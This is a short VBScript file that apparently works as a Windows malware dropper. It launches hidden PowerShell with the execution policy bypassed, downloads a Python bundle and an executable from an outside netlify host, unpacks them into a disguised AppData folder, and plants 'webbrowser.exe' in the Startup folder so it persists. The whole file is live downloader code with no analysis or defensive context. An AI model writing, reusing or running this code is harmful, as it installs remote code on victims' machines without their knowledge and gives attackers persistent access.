Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
' hexa BroMaker.
tempZip = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\p.zip"
appDir = WshShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Application"
startupDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
exePath = startupDir & "\webbrowser.exe"
pythonExe = appDir & "\python\python.exe"
pyScript = appDir & "\Alpela.py"

If fso.FileExists(pyScript) Then
    WScript.Quit
End If

If Not fso.FolderExists(appDir) Then
    On Error Resume Next
    fso.CreateFolder(appDir)
    On Error GoTo 0
End If

WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/python.zip' -OutFile '" & tempZip & "'""", 0, True

If fso.FileExists(tempZip) Then
    WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path '" & tempZip & "' -DestinationPath '" & appDir & "' -Force""", 0, True
    On Error Resume Next
    fso.DeleteFile tempZip, True
    On Error GoTo 0
End If

If Not fso.FileExists(exePath) Then
    WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/webbrowser.exe' -OutFile '" & exePath & "'""", 0, True
End If

WScript.Quit
